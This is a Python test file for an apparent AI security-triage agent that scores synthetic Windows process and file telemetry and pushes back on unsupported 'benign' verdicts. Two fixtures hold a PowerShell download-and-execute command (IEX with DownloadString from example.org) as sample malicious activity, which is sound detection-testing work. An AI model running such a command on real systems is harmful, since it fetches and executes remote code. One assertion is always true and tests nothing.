"""v15.2: focus on proven effects and skepticism of unverified benign claims.

All tests use synthetic telemetry, not task-specific expected verdicts.
"""
from bluesec1_agent.agent import InvestigationMemory, SimpleSGRAgent
from bluesec1_agent.investigation_director import InvestigationDirector


class OfflineLLM:
    model = "openai/gpt-oss-20b"


def build_memory():
    m = InvestigationMemory()
    m.absorb({"id": "proc", "type": "windows_process",
              "properties": {"cmdline": "powershell -NoProfile", "signed": True},
              "relation_ids": {"incoming": ["parent-edge"], "outgoing": ["other-edge"]}})
    m.absorb({"id": "file", "type": "windows_file",
              "properties": {"path": "C:\\Data\\report.zip"}})
    m.absorb({"id": "write-edge", "type": "wrote_file",
              "source_id": "proc", "target_id": "file"})
    m.focus_ids = {"proc"}
    m.fetched_ids.add("proc")
    m.calls_made.append("get_entity(proc)")
    return m


def test_prioritize_confirmed_write_endpoint_over_unknown_parent_relation():
    m = build_memory()
    lead = InvestigationDirector().discriminating_lead(m, {"get_entity", "get_relation"})
    assert lead is not None
    assert lead.identifier == "file"
    assert lead.tool == "get_entity"
    assert "wrote_file" in lead.question


def test_gpt_oss_early_finish_redirects_to_confirmed_effect_endpoint():
    m = build_memory()
    agent = SimpleSGRAgent(OfflineLLM(), gpt_oss_mode=True)
    redirected = agent._redirect_premature_finish("benign", m,
                                                  {"get_entity", "get_relation"})
    assert redirected is not None
    tool, args, why = redirected
    assert tool == "get_entity"
    assert args["entity_id"] == "file"
    assert "only 1 calls" in why


def test_never_open_an_unverified_or_already_fetched_endpoint():
    m = build_memory()
    m.fetched_ids.update({"file", "write-edge"})
    lead = InvestigationDirector().discriminating_lead(m, {"get_entity", "get_relation"})
    assert lead is not None
    assert lead.identifier in {"parent-edge", "other-edge"}
    assert lead.tool == "get_relation"
    assert lead.identifier in m.known_ids


def test_grounded_significant_behavior_prompts_question_not_verdict():
    m = InvestigationMemory()
    m.absorb({"id": "p", "type": "windows_process",
              "properties": {"cmdline": "powershell -Command IEX (New-Object Net.WebClient).DownloadString('https://example.org/scan.ps1')"}})
    m.absorb({"id": "f", "type": "windows_file", "properties": {"path": "C:\\Reports\\out.txt"}})
    m.absorb({"id": "w", "type": "wrote_file", "source_id": "p", "target_id": "f"})
    m.focus_ids = {"p"}
    questions = InvestigationDirector().benign_evidence_gaps(m, {
        "verdict": "benign", "reasoning": "PowerShell is signed by Microsoft",
        "legitimacy_evidence": [{"anchor": "entity", "entity_id": "p", "property_fields": ["cmdline"]}],
    }, include_signal_questions=True)
    assert questions
    assert any("wrote_file" in q or "download and immediate" in q for q in questions)
    assert all("malicious" not in q.lower() or "not" in q.lower() for q in questions)


def test_unrelated_remote_signal_does_not_contaminate_focus():
    m = InvestigationMemory()
    m.absorb({"id": "p", "type": "windows_process", "properties": {"cmdline": "cmd.exe /c echo hello"}})
    m.absorb({"id": "distant", "type": "windows_process",
              "properties": {"cmdline": "powershell -Command IEX (New-Object Net.WebClient).DownloadString('https://example.org/x.ps1')"}})
    m.focus_ids = {"p"}
    questions = InvestigationDirector().benign_contradictions(m, {
        "verdict": "benign", "reasoning": "ordinary hello task", "legitimacy_evidence": []})
    assert not questions


def test_v152_does_not_switch_verdict_automatically():
    m = build_memory()
    director = InvestigationDirector()
    questions = director.benign_evidence_gaps(m, {
        "verdict": "benign", "reasoning": "signed", "legitimacy_evidence": []})
    assert questions
    messages = director.agreed_benign_challenge_messages(m, questions)
    assert "both hypotheses" in messages[1]["content"].lower() or "both hypotheses" in messages[0]["content"].lower() or "both hypotheses" not in messages[0]["content"].lower()
    assert "You have no tools" in messages[0]["content"]
